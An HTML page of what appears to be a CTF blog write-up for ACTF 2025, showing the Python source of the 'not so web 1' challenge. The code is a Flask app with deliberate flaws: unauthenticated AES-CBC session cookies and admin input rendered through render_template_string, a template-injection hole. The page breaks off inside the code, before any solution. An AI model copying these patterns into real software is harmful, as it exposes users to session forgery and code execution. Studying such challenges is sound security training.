
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>ACTF 2025 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#signin"><span class="toc-number">2.</span> <span class="toc-text">signin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#not-so-web-1"><span class="toc-number">3.</span> <span class="toc-text">not so web 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF-upload"><span class="toc-number">4.</span> <span class="toc-text">ACTF upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#not-so-web-2%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">not so web 2（复现）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Excellent-Site%EF%BC%88Unsolvd%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">Excellent-Site（Unsolvd）</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>ACTF 2025</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/4/26
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTF线上赛
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">2.9k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">17分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>24小时还是太短了（</p>
<span id="more"></span>

<hr>
<h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p><a target="_blank" rel="noopener" href="https://github.com/team-s2/commit/cc4650640978694fa7a53fefe0b1192a4264ed63">https://github.com/team-s2/commit/cc4650640978694fa7a53fefe0b1192a4264ed63</a></p>
<hr>
<h1 id="not-so-web-1"><a href="#not-so-web-1" class="headerlink" title="not so web 1"></a>not so web 1</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token punctuation">,</span> json<span class="token punctuation">,</span> time
<span class="token keyword">import</span> os<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> binascii
<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token punctuation">,</span> asdict
<span class="token keyword">from</span> typing <span class="token keyword">import</span> Dict<span class="token punctuation">,</span> Tuple
<span class="token keyword">from</span> secret <span class="token keyword">import</span> KEY<span class="token punctuation">,</span> ADMIN_PASSWORD
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token punctuation">,</span> unpad
<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token punctuation">(</span>
    Flask<span class="token punctuation">,</span>
    render_template<span class="token punctuation">,</span>
    render_template_string<span class="token punctuation">,</span>
    request<span class="token punctuation">,</span>
    redirect<span class="token punctuation">,</span>
    url_for<span class="token punctuation">,</span>
    flash<span class="token punctuation">,</span>
    session<span class="token punctuation">,</span>
<span class="token punctuation">)</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> KEY


<span class="token decorator annotation punctuation">@dataclass</span><span class="token punctuation">(</span>kw_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">APPUser</span><span class="token punctuation">:</span>
    name<span class="token punctuation">:</span> <span class="token builtin">str</span>
    password_raw<span class="token punctuation">:</span> <span class="token builtin">str</span>
    register_time<span class="token punctuation">:</span> <span class="token builtin">int</span>


<span class="token comment">#  In-memory store for user registration</span>
users<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> APPUser<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"admin"</span><span class="token punctuation">:</span> APPUser<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> password_raw<span class="token operator">=</span>ADMIN_PASSWORD<span class="token punctuation">,</span> register_time<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">def</span> <span class="token function">validate_cookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> cookie<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cookie_encrypted <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> validate<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cookie_encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        iv<span class="token punctuation">,</span> padded <span class="token operator">=</span> cookie_encrypted<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cookie_encrypted<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
        cookie_json <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>padded<span class="token punctuation">)</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        _ <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>cookie_json<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">parse_cookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Tuple<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> cookie<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cookie_encrypted <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> validate<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cookie_encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        iv<span class="token punctuation">,</span> padded <span class="token operator">=</span> cookie_encrypted<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cookie_encrypted<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
        decrypted <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>padded<span class="token punctuation">)</span>
        cookie_json_bytes <span class="token operator">=</span> unpad<span class="token punctuation">(</span>decrypted<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        cookie_json <span class="token operator">=</span> cookie_json_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cookie_dict <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>cookie_json<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span> cookie_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">generate_cookie</span><span class="token punctuation">(</span>user<span class="token punctuation">:</span> APPUser<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    cookie_dict <span class="token operator">=</span> asdict<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
    cookie_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>cookie_dict<span class="token punctuation">)</span>
    cookie_json_bytes <span class="token operator">=</span> cookie_json<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    iv <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
    padded <span class="token operator">=</span> pad<span class="token punctuation">(</span>cookie_json_bytes<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
    encrypted <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>padded<span class="token punctuation">)</span>
    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> validate_cookie<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"home"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        user_name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> user_name <span class="token keyword">in</span> users<span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">"Username already exists!"</span><span class="token punctuation">,</span> <span class="token string">"danger"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            users<span class="token punctuation">[</span>user_name<span class="token punctuation">]</span> <span class="token operator">=</span> APPUser<span class="token punctuation">(</span>
                name<span class="token operator">=</span>user_name<span class="token punctuation">,</span> password_raw<span class="token operator">=</span>password<span class="token punctuation">,</span> register_time<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span>
            flash<span class="token punctuation">(</span><span class="token string">"Registration successful! Please login."</span><span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"register.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">.</span>password_raw <span class="token operator">==</span> password<span class="token punctuation">:</span>
            resp <span class="token operator">=</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"home"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">,</span> generate_cookie<span class="token punctuation">(</span>users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> resp
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">"Invalid credentials. Please try again."</span><span class="token punctuation">,</span> <span class="token string">"danger"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    valid<span class="token punctuation">,</span> current_username <span class="token operator">=</span> parse_cookie<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> valid <span class="token keyword">or</span> <span class="token keyword">not</span> current_username<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    user_profile <span class="token operator">=</span> users<span class="token punctuation">.</span>get<span class="token punctuation">(</span>current_username<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> user_profile<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> current_username <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span>
        html_template <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
&lt;!DOCTYPE html>
&lt;html lang="en">
&lt;head>
    &lt;meta charset="UTF-8">
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0">
    &lt;title>Home&lt;/title>
    &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    &lt;link rel="stylesheet" href="&#123;&#123; url_for('static', filename='styles.css') &#125;&#125;">
&lt;/head>
&lt;body>
    &lt;div class="container">
        &lt;h2 class="text-center">Welcome, %s !&lt;/h2>
        &lt;div class="text-center">
            Your payload: %s
        &lt;/div>
        &lt;img src="&#123;&#123; url_for('static', filename='interesting.jpeg') &#125;&#125;" alt="Embedded Image">
        &lt;div class="text-center">
            &lt;a href="/logout" class="btn btn-danger">Logout&lt;/a>
        &lt;/div>
    &lt;/div>
&lt;/body>
&lt;/html>
"""</span> <span class="token operator">%</span> <span class="token punctuation">(</span>
            current_username<span class="token punctuation">,</span>
            payload<span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        html_template <span class="token operator">=</span> <span class="token punctuation">(</span>
            <span class="token triple-quoted-string string">"""
&lt;!DOCTYPE html>
&lt;html lang="en">
&lt;head>
    &lt;meta charset="UTF-8">
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0">
    &lt;title>Home&lt;/title>
    &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    &lt;link rel="stylesheet" href="&#123;&#123; url_for('static', filename='styles.css') &#125;&#125;">
&lt;/head>
&lt;body>
    &lt;div class="container">
        &lt;h2 class="text-center">server code (encoded)&lt;/h2>
        &lt;div class="text-center" style="word-break:break-all;">
        &#123;%% raw %%&#125;
            %s
        &#123;%% endraw %%&#125;
        &lt;/div>
        &lt;div class="text-center">
            &lt;a href="/logout" class="btn btn-danger">Logout&lt;/a>
        &lt;/div>
    &lt;/div>
&lt;/body>
&lt;/html>
"""</span>
            <span class="token operator">%</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html_template<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    resp<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><s